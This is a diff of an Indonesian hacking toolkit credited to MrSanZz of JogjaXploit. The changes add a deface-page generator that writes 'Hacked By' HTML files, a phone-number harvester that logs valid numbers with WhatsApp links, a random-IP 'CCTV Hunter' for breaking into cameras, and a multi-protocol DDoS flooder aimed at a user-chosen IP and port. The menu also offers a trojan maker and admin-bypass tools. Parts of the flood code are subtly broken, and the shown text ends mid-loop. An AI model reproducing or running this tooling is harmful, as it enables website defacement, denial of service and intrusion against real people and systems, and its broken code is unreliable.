@@ -5,14 +5,11 @@ except SyntaxError as e:
     if e == True:
         print("Hey Idiot, Use python3.")   
 import time
-print("Please Wait.. The Tools Is Loading Assets..")
-time.sleep(2)
 try:
     print("Checking For Module..")
 except ModuleNotFoundError as e:
     if e == True:
         print('Module Not Found: ', (e))
-        
 import time
 import os
 from os.path import exists
@@ -43,7 +40,14 @@ from phonenumbers import timezone, geocoder, carrier
 from pythonping import ping
 import exiftool
 import importlib
-
+import socket #new
+import threading
+import os
+import sys
+import colorama
+import cloudscraper
+import random
+from colorama import Fore, Back, Style, init
 global user_ip
 user_ip = Faker()
 ip_addr = user_ip.ipv4()
@@ -157,7 +161,7 @@ print(f"""
                 ░░         ░   ▒      ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
                  ░              ░  ░         ░    ░        ░ ░     ░           ░  ░                       
                                       \033[1;32mCoded By : MrSanZz
-                                           V : 3.1.2
+                                           V : 3.1.6
                                        Team:JogjaXploit
                                   \033[1;33mhttps://github.com/MrSanZz
 """)
@@ -2097,10 +2101,10 @@ elif answer == ("20"):
     {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                     [11] Simple Pentest                          {yellow}│{blue}
     {yellow}│{blue} [02] Bypasser Admin V4 {red}[Hot Results]{blue}               [12] Mass Dorks {red}[Ok Results]{blue}                 {yellow}│{blue}
     {yellow}│{blue} [03] Deface SC Maker                               [13] {green}Deface Maker V2{blue}                         {yellow}│{blue}
-    {yellow}│{blue} [04] Trojan Maker                                                                               {yellow}│{blue}
-    {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}                                                       {yellow}│{blue}
-    {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                                                              {yellow}│{blue}
-    {yellow}│{blue} [07] Mass Deface V3                                                                             {yellow}│{blue}
+    {yellow}│{blue} [04] Trojan Maker                                  [14] Phone Hunter                            {yellow}│{blue}
+    {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}          [15] CCTV Hunter                             {yellow}│{blue}
+    {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                 [16] Heart                                   {yellow}│{blue}
+    {yellow}│{blue} [07] Mass Deface V3                                [17] BXB maker                               {yellow}│{blue}
     {yellow}│{blue} [08] DIRBER                                                                                     {yellow}│{blue}
     {yellow}│{blue} [09] Bypass Admin With File.txt                                                                 {yellow}│{blue}
     {yellow}│{blue} [10] Leaker V4 {red}[Hot Results]{blue}                                                                    {yellow}│{blue}
@@ -2691,11 +2695,12 @@ elif answer == ("20"):
                         num = num + 1
                         rand_user = random.choice(user_agents)
                         for results in search(f'filetype:{i} site:{site} intext:{data} {date}', tld='com', lang='en', num=int(num), pause=2, stop=0, start=0):
-                            print('')
-                            print(success + results)
-                            wget.download(results, out=site)
-                        else:
-                            print(white + f"[!] Couldn't Find For {i} Site : {site}")
+                            if results:
+                                print('')
+                                print(success + results)
+                                wget.download(results, out=site)
+                            else:
+                                print(white + f"[!] Couldn't Find For {i} Site : {site}")
                     except urllib.error.HTTPError as e:
                         if e.code == 429:
                             print(fail + f"[!] 429 Error !!, Coldown For 25 Sec.. [!]")
@@ -2741,17 +2746,18 @@ elif answer == ("20"):
                         req = 1
                         req = req + 1
                         for results in search(f'filetype:{i} site:{site} intext:{data} {date}', num=int(req), pause=2, stop=None, start=0):
-                            print('')
-                            print(success + results)
-                            def log(site):
-                                file = open((site) + ".txt", "a")
-                                file.write(str(results))
-                                file.write("\n")
-                                file.close
-                                file_name = site
-                            log(site)
-                        else:
-                            print(fail + f"[!] File {i} Doesn't Exists [!]")
+                            if results:
+                                print('')
+                                print(success + results)
+                                def log(site):
+                                    file = open((site) + ".txt", "a")
+                                    file.write(str(results))
+                                    file.write("\n")
+                                    file.close
+                                    file_name = site
+                                log(site)
+                            else:
+                                print(fail + f"[!] File {i} Doesn't Exists [!]")
                     except urllib.error.HTTPError as e:
                         if e.code == 429:
                             print(fail + f"[!] Error 429.. Coldown 25 sec.. [!]")
@@ -2834,22 +2840,24 @@ elif answer == ("20"):
         ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
         """)
         try:
-            print(info + f"Example : dorks = inurl:/admin/dashboard.php inurl:/review.php?id= inurl:/admin-intext:welcome")
+            print(info + f"Example : dorks = inurl:/admin/dashboard.php,inurl:/review.php?id=,inurl:/admin intext:welcome")
             dork = input(blue + f"dorks = ")
-            e = dork.split()
+            e = dork.split(',')
             dorks = e
             
             for i in dorks:
                 rand_user = random.choice(user_agents)
                 print(info + f"[ + ] Searching : {i} [ + ]")
                 for results in search(f'{i}', num=int(1), start=0, stop=None, pause=4):
-                    print(success + results)
+                    if results:
+                        print(success + results)
+                    else:
+                        print(fail + f"[!] Couldn't Find In This Dork [!]")
         except urllib.error.HTTPError as e:
             if e.code == 429:
                 print(fail + f"[!] 429 Error [!]")
         except KeyboardInterrupt:
-            print(green + f"Interrupt Detected")
-            exit()
+            print(green + f"Skipped")
     elif answer == "13":
         pass
         if os.name == "posix":
@@ -2872,6 +2880,10 @@ elif answer == ("20"):
         print(f"{red_t}╟ {gray}6. Deface 6{red_t}                           ║")
         print(f"{red_t}╚═══════════════════════════════════════╝")
         choice = input(f"Choice : ")
+        try:
+            os.mkdir('Deface')
+        except FileExistsError:
+            pass
         if choice == "1":
             pass
             name = input(info + f"Attacker name : ")
@@ -2923,17 +2935,20 @@ elif answer == ("20"):
             </span>
             """
             sc = sc1 + sc5
-            def logging(file_name):
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
                 try:
                     time.sleep(0.5)
-                    file = open((file_name) + ".html", "a")
-                    file.write(str(sc))
-                    file.close()
-                    file_name = file_name
-                    print(success + f"Success make file {file_name}")
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
                 except FileExistsError:
-                    print(f"File {file_name} Already Exists !")
-            logging(file_name)
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
         elif choice == "2":
             pass
             name = input(info + f"Attacker name : ")
@@ -2973,17 +2988,20 @@ elif answer == ("20"):
             <audio controls src="https://kosred.com/a/jsmuvk.mp3">
             """
             sc = sc1 + sc2
-            def logging(file_name):
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
                 try:
                     time.sleep(0.5)
-                    file = open((file_name) + ".html", "a")
-                    file.write(str(sc))
-                    file.close()
-                    file_name = file_name
-                    print(success + f"Success make file {file_name}")
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
                 except FileExistsError:
-                    print(f"File {file_name} Already Exists !")
-            logging(file_name)
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
         elif choice == "3":
             pass
             name = input(info + f"Attacker name : ")
@@ -3050,18 +3068,21 @@ elif answer == ("20"):
             <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
             """
             sc = sc1
-            def logging(file_name):
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
                 try:
                     time.sleep(0.5)
-                    file = open((file_name) + ".html", "a")
-                    file.write(str(sc))
-                    file.close()
-                    file_name = file_name
-                    print(success + f"Success make file {file_name}")
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
                 except FileExistsError:
-                    print(f"File {file_name} Already Exists !")
-            logging(file_name)
-        elif answer == "4":
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
+        elif choice == "4":
             pass
             name = input(info + f"Attacker name : ")
             team = input(info + f"Team name : ")
@@ -3095,18 +3116,21 @@ elif answer == ("20"):
             </html>
             """
             sc = sc1
-            def logging(file_name):
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
                 try:
                     time.sleep(0.5)
-                    file = open((file_name) + ".html", "a")
-                    file.write(str(sc))
-                    file.close()
-                    file_name = file_name
-                    print(success + f"Success make file {file_name}")
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
                 except FileExistsError:
-                    print(f"File {file_name} Already Exists !")
-            logging(file_name)
-        elif answer == "5":
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
+        elif choice == "5":
             pass
             name = input(info + f"Attacker name : ")
             team = input(info + f"Team name : ")
@@ -3166,19 +3190,447 @@ elif answer == ("20"):
                 <p>{team}</p>
             """
             sc = sc1
-            def logging(file_name):
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
                 try:
                     time.sleep(0.5)
-                    file = open((file_name) + ".html", "a")
-                    file.write(str(sc))
-                    file.close()
-                    file_name = file_name
-                    print(success + f"Success make file {file_name}")
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
                 except FileExistsError:
-                    print(f"File {file_name} Already Exists !")
-            logging(file_name)
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
+        elif choice == "6":
+            pass
+            name = input(info + f"Attacker name : ")
+            msg = input(info + f"Message : ")
+            file_name = input(info + f"Save as [e.x : sanzz]: ")
+            grts = input(f"Greetz : ")
+            music = input(f"Music URL : ")
+            e = input(info + f"Photo / Logo [Skip for default icon]: ")
+            width = input("Logo Width [Default : 300] : ")
+            height = input("Logo Height [Default : 300] : ")
+            logs = ['https://pa1.narvii.com/5720/b5b2f3fc8e3cbd75c382b472a31c69ad4a4b3320_hq.gif']
+            rdd = random.choice(logs)
+            if e:
+                logo = e
+            else:
+                logo = rdd
+            st1 = """
+            {display:table;height:100%;width:100%;} body{background-color:black; } body{display:table-cell;vertical-align:middle;text-align:center;} img { opacity:0.8; }
+            """
+            sc1 = f"""
+            <!DOCTYPE html>
+            <html lang="en"><head></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">&lt;------------
+            -------------- copyright {name} ------------&gt;
+            <title>Hacked By {name}</title> <link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type="text/css"> <meta content="Hacked By {name}" name="description"> <meta content="Hacked By {name}" name="keywords"> <meta content="Hacked By {name}" name="Abstract"> <meta name="title" content="Str0ng3"> <meta name="description" content=""> <meta name="keywords" content="Hacked"> <meta name="googlebot" content="index,follow"> <meta name="robots" content="all"> <meta name="robots schedule" content="auto"> <meta name="distribution" content="global"> <style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Megrim'); html{st1} </style>   <center> <img src="{logo}" width="{width}" height="{height}"><br><br> <font face="Megrim" font="" color="white" size="6"><b>Hacked By {name}</b><br> </font></center> <center><font face="Shadows Into Light Two" color="#fff" size="3px">-=!!=- {msg} -=!!=-</font></center> <br> <font face="Shadows Into Light Two" color="#fff" size="3px">-= Greetz =-<br></font> <font face="Shadows Into Light Two" size="3px" color="#ff0000">=- {grts} -=<br></font>
+            <audio src="{music}" loop="True" autoplay hidden></audio>
+            </body></html>
+            """
+            sc = sc1
+            target_directory = 'Deface'
+
+            file_path = os.path.join(target_directory, file_name)
+
+            def logging(file_path, file_name):
+                try:
+                    time.sleep(0.5)
+                    with open(file_path + ".html", "w") as file:
+                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                    print(success + f"Success make file {file_name}.html")
+                except FileExistsError:
+                    print(f"File {file_name}.html Already Exists !")
+
+            logging(file_path, file_name)
         else:
-            print("Doesn't Exists, Please Wait For The Update..")
+            print("Exit . . .")
+    elif answer == '14':
+        pass
+        if os.name == 'posix':
+            os.system('clear')
+        elif os.name == 'nt':
+            os.system('cls')
+        white = '\033[1;37m'
+        red = '\033[1;91m'
+        logo = f"""
+
+        {red}██████{white}╗ {red}██{white}╗  {red}██{white}╗ {red}██████{white}╗ {red}███{white}╗   {red}██{white}╗{red}███████{white}╗    {red}██{white}╗  {red}██{white}╗{red}██{white}╗   {red}██{white}╗{red}███{white}╗   {red}██{white}╗{red}████████{white}╗{red}███████{white}╗{red}██████{white}╗ 
+        {red}██{white}╔══{red}██{white}╗{red}██{white}║  {red}██{white}║{red}██{white}╔═══{red}██{white}╗{red}████{white}╗  {red}██{white}║{red}██{white}╔════╝    {red}██{white}║  {red}██{white}║{red}██{white}║   {red}██{white}║{red}████{white}╗  {red}██{white}║╚══{red}██{white}╔══╝{red}██{white}╔════╝{red}██{white}╔══{red}██{white}╗
+        {red}██████{white}╔╝{red}███████{white}║{red}██{white}║   {red}██{white}║{red}██{white}╔{red}██{white}╗ {red}██{white}║{red}█████{white}╗      {red}███████{white}║{red}██{white}║   {red}██{white}║{red}██{white}╔{red}██{white}╗ {red}██{white}║   {red}██{white}║   {red}█████{white}╗  {red}██████{white}╔╝
+        {red}██{white}╔═══╝ {red}██{white}╔══{red}██{white}║{red}██{white}║   {red}██{white}║{red}██{white}║╚{red}██{white}╗{red}██{white}║{red}██{white}╔══╝      {red}██{white}╔══{red}██{white}║{red}██{white}║   {red}██{white}║{red}██{white}║╚{red}██{white}╗{red}██{white}║   {red}██{white}║   {red}██{white}╔══╝  {red}██{white}╔══{red}██{white}╗
+        {red}██{white}║     {red}██{white}║  {red}██{white}║╚{red}██████{white}╔╝{red}██{white}║ ╚{red}████{white}║{red}███████{white}╗    {red}██{white}║  {red}██{white}║╚{red}██████{white}╔╝{red}██{white}║ ╚{red}████{white}║   {red}██{white}║   {red}███████{white}╗{red}██{white}║  {red}██{white}║
+        {white}╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+                                                By MrSanZz
+                                            Team JogjaXploit
+        """
+        print(logo)
+        print('')
+        try:
+            o = int(input("HOW MANY YOU WANT TO HUNT : "))
+            re = input("Phone Number Region Code [Don't Use + ] : ")
+            loges = input(f"Name For Save : ")
+            try:
+                os.mkdir('HuntPhone')
+            except FileExistsError:
+                pass
+        except ValueError:
+            print("Did you fill correctly?, Please retry..")
+            exit()
+        try:
+            if len(re) == 2:
+                print("2 Digit Detected")
+                reg = '+'+re
+                for i in range(o):
+                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+                    i = random.choice(angka)
+                    b = random.choice(angka)
+                    n = random.choice(angka)
+                    m = random.choice(angka)
+                    z = random.choice(angka)
+                    a = random.choice(angka)
+                    s = random.choice(angka)
+                    d = random.choice(angka)
+                    w = random.choice(angka)
+                    l = random.choice(angka)
+                    k = random.choice(angka)
+                    N = reg+i+b+n+m+z+a+s+d+w+l+k #11
+                    pN = phonenumbers.parse(N)
+                    ie = phonenumbers.is_valid_number(pN)
+                    wa = f'https://api.whatsapp.com/send?phone={N}'
+                    target_directory = 'HuntPhone'
+                    file_name = loges
+
+                    file_path = os.path.join(target_directory, file_name)
+
+                    def logger(file_path, file_name):
+                        try:
+                            with open(file_path + ".txt", "a") as file:
+                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                                file.write('\n')
+                                file.write(str(wa))
+                                file.write('\n')
+                                file.close
+                        except FileExistsError:
+                            print(f"File {file_name}.txt Already Exists !")
+                            exit()
+                    
+                    if ie:
+                        print('Valid: ', N, end='\r')
+                        logger(file_path, file_name)
+                    else: 
+                        print('Valid:  No             ', end='\r')
+                print("Done Hunting..         ")
+            elif len(re) == 3:
+                print("3 Digit Detected")
+                reg = '+'+re
+                for i in range(o):
+                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+                    i = random.choice(angka)
+                    b = random.choice(angka)
+                    n = random.choice(angka)
+                    m = random.choice(angka)
+                    z = random.choice(angka)
+                    a = random.choice(angka)
+                    s = random.choice(angka)
+                    d = random.choice(angka)
+                    w = random.choice(angka)
+                    N = reg+i+b+n+m+z+a+s+d+w #9
+                    pN = phonenumbers.parse(N)
+                    ie = phonenumbers.is_valid_number(pN)
+                    wa = f'https://api.whatsapp.com/send?phone={N}'
+                    target_directory = 'HuntPhone'
+                    file_name = loges
+
+                    file_path = os.path.join(target_directory, file_name)
+
+                    def logger(file_path, file_name):
+                        try:
+                            with open(file_path + ".txt", "a") as file:
+                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                                file.write('\n')
+                                file.write(str(wa))
+                                file.write('\n')
+                                file.close
+                        except FileExistsError:
+                            print(f"File {file_name}.txt Already Exists !")
+                            exit()
+                    
+                    if ie:
+                        print('Valid: ', N, end='\r')
+                        logger(file_path, file_name)
+                    else: 
+                        print('Valid:  No             ', end='\r')
+                print("Done Hunting..         ")
+            elif len(re) < 2:
+                print("1 Digit Detected")
+                reg = '+'+re
+                for i in range(o):
+                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+                    i = random.choice(angka)
+                    b = random.choice(angka)
+                    n = random.choice(angka)
+                    m = random.choice(angka)
+                    z = random.choice(angka)
+                    a = random.choice(angka)
+                    s = random.choice(angka)
+                    d = random.choice(angka)
+                    w = random.choice(angka)
+                    x = random.choice(angka)
+                    N = reg+i+b+n+m+z+a+s+d+w+x #10
+                    pN = phonenumbers.parse(N)
+                    ie = phonenumbers.is_valid_number(pN)
+                    wa = f'https://api.whatsapp.com/send?phone={N}'
+                    target_directory = 'HuntPhone'
+                    file_name = loges
+
+                    file_path = os.path.join(target_directory, file_name)
+
+                    def logger(file_path, file_name):
+                        try:
+                            with open(file_path + ".txt", "a") as file:
+                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
+                                file.write('\n')
+                                file.write(str(wa))
+                                file.write('\n')
+                                file.close
+                        except FileExistsError:
+                            print(f"File {file_name}.txt Already Exists !")
+                            exit()
+                    
+                    if ie:
+                        print('Valid: ', N, end='\r')
+                        logger(file_path, file_name)
+                    else: 
+                        print('Valid:  No             ', end='\r')
+                print("Done Hunting..         ")
+        except PermissionError:
+            print("Don't open the file/folder if it is processing!!")
+            print("E: PermissionError")
+        except KeyboardInterrupt:
+            print("Exit..")
+            exit()
+    elif answer == '15':
+        pass
+        if os.name == 'posix':
+            os.system('clear')
+        elif os.name == 'nt':
+            os.system('cls')
+        print("Your OS : ", os.name)
+        num = int(input("Total CCTV You Want To Hack : "))
+        print('Please Wait !!')
+        for i in range(num):
+            try:
+                angka = ['1', '2', '3', '4', '5', '6', '7', '8', '9','0']
+                #5
+                n1 = random.choice(angka)
+                n2 = random.choice(angka)
+                n3 = random.choice(angka)
+                n4 = random.choice(angka)
+                n5 = random.choice(angka)
+                #6
+                a1 = random.choice(angka)
+                a2 = random.choice(angka)
+                a3 = random.choice(angka)
+                a4 = random.choice(angka)
+                a5 = random.choice(angka)
+                a6 = random.choice(angka)
+                a7 = random.choice(angka)
+                a8 = random.choice(angka)
+                #7
+                b1 = random.choice(angka)
+                b2 = random.choice(angka)
+                b3 = random.choice(angka)
+                b4 = random.choice(angka)
+                b5 = random.choice(angka)
+                b6 = random.choice(angka)
+                b7 = random.choice(angka)
+                b8 = random.choice(angka)
+                b9 = random.choice(angka)
+                port = ['8080', '443', '1225', '80', '5050', '55', '6656' ,'3242', '134', '1334', '1676', '9090', '2555', '2525', '5255']
+                p = random.choice(port)
+                p2 = random.choice(port)
+                p3 = random.choice(port)
+                seg5 = f'https://1{n1}{n2}.{n1}{n2}{n3}.{n4}.{n5}:{p}'
+                seg6 = f'https://1{a1}{a2}.{a3}{a4}{a5}.{a6}{a7}.{a8}:{p2}'
+                seg7 = f'https://1{b1}{b2}.{b3}{b4}{b5}.{b6}{b7}.{b8}{b9}:{p3}'
+                print("Trying", seg5, seg6, seg7)
+                while True:
+                    response1 = requests.get(seg5)
+                    response2 = requests.get(seg6)
+                    response3 = requests.get(seg7)
+                    if response1.status_code == 200:
+                        print(seg5)
+                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
+                    elif response2.status_code == 200:
+                        print(seg6)
+                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
+                    elif response3.status_code == 200:
+                        print(seg7)
+                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
+                    else:
+                        print("No response from target..")
+            except:
+                print("Ups, Something just kick out")
+                continue
+    elif answer == '16':
+        try:
+            import socket
+            import threading
+            import os
+            import sys
+            import colorama
+            import cloudscraper
+            import random
+            from colorama import Fore, Back, Style, init
+            init(convert=True)
+            if os.name == "posix":
+                os.system('clear')
+            elif os.name == "nt":
+                os.system('cls')
+    
+            fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
+            global ua
+            ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
+            print(Fore.LIGHTWHITE_EX + "╔════════════════════════════════════════════════════════════════════════╗")
+            print("║                             "+Fore.LIGHTWHITE_EX+"╦ ╦┌─┐┌─┐┬─┐┌┬┐"+Fore.LIGHTCYAN_EX+"                            ║")
+            print("║                             "+Fore.LIGHTWHITE_EX+"╠"+Fore.LIGHTCYAN_EX+"═╣├┤ ├─┤├┬┘ │"+Fore.LIGHTCYAN_EX+"                             ║")
+            print("║                             "+Fore.LIGHTCYAN_EX+"╩ ╩└─┘┴ ┴┴└─ ┴"+Fore.LIGHTCYAN_EX+"                             ║")
+            print("╠═══════════════════>"+Fore.LIGHTWHITE_EX+"Welcome to the main page heart <3"+Fore.LIGHTCYAN_EX+"<══════════════════╣")
+            print("║                          "+Fore.LIGHTRED_EX+"  MADE IN INDONESIA"+Fore.LIGHTCYAN_EX+"                           ║")
+            print("║                          "+Fore.LIGHTWHITE_EX+"     ABOUT THIS :"+Fore.LIGHTCYAN_EX+"                             ║")
+            print("║                "+Fore.LIGHTWHITE_EX+"    This tool was created by MrSanZz                    ║")
+            print("║            "+Fore.LIGHTWHITE_EX+" inspired by Karma DDOS, supported by JogjaXploit"+Fore.LIGHTCYAN_EX+"           ║")
+            print("║                      "+Fore.LIGHTWHITE_EX+" TELEGRAM : t.me/MrSanZzXe"+Fore.LIGHTCYAN_EX+"                        ║")
+            print("║                           "+Fore.LIGHTWHITE_EX+" Your Heart Ddosed!"+Fore.LIGHTCYAN_EX+"                          ║")
+            print("║                          "+Fore.LIGHTWHITE_EX+" We Are : JogjaXploit"+Fore.LIGHTCYAN_EX+"                         ║")
+            print("╚══════════════════════════════════════════════════════════"+Fore.LIGHTWHITE_EX+"══════════════╝")
+            print('')
+    
+            ip = input(f"IP Target : ")
+            port = int(input("Port : "))
+            bps = int(input("Byte Per Sec : "))
+            thrd = int(input("Threads : "))
+            boost = input("Use Boost ? Y/N : ")
+            if boost == 'n':
+                bps = bps
+            elif boost == 'y':
+                bps = bps + 1000
+            else:
+                print("Skipped")
+                bps = bps
+                pass
+            def c2_special():
+                for fk in fake:
+                    try:
+                        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        byte = random._urandom(65000)
+                        tip = tuple(ip)
+                        udp.sendto(byte, (ip,port))
+                        http.connect((ip,port))
+                        msg = {
+                            "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
+                            "User-Agent: "+random.choice(ua)+"\r\n"
+                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                            "Connection: Keep-Alive\r\n\r\n"
+                        }
+                        tls.connect((ip,port))
+                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                        scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
+                        scraper = cloudscraper.create_scraper(browser='chrome')
+                        for i in range(bps):
+                            udp.sendto(byte, (ip,port))
+                            udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                            http.sendto(byte, (ip,port))
+                            tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                            pack = "SYN\x00"
+                            pack_len = len(pack)
+                            tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
+                            tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
+                            tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
+                            # Add TCP/IP header
+                            tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
+                            tcp.send(tcp_packet, (ip,port))
+                            scraper.get(ip, timeout=thrd)
+                    except TimeoutError:
+                        count = int(0)
+                        count += 1
+                        print(Fore.LIGHTRED_EX+'TARGET IS DOWN : ERR.CONNECTION.TIMEOUT                             ', end='\r')
+                    except TypeError:
+                        continue
+                    except:
+                        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        byte = random._urandom(65000)
+                        udp.sendto(byte, (ip,port))
+                        http.connect((ip,port))
+                        msg = {
+                            "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
+                            "User-Agent: "+random.choice(ua)+"\r\n"
+                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                            "Connection: Keep-Alive\r\n\r\n"
+                        } 
+                        tls.connect((ip,port))
+                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                        scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
+                        scraper = cloudscraper.create_scraper(browser='chrome')
+                        for i in range(bps):
+                            udp.sendto(byte, (ip,port))
+                            udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                            http.sendto(byte, (ip,port))
+                            tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                            pack = "SYN\x00"
+                            pack_len = len(pack)
+                            tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
+                            tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
+                            tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
+                            # Add TCP/IP header
+                            tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
+                            tcp.send(tcp_packet, (ip,port))
+                            scraper.get(ip, timeout=thrd)
+            for i in range(thrd):
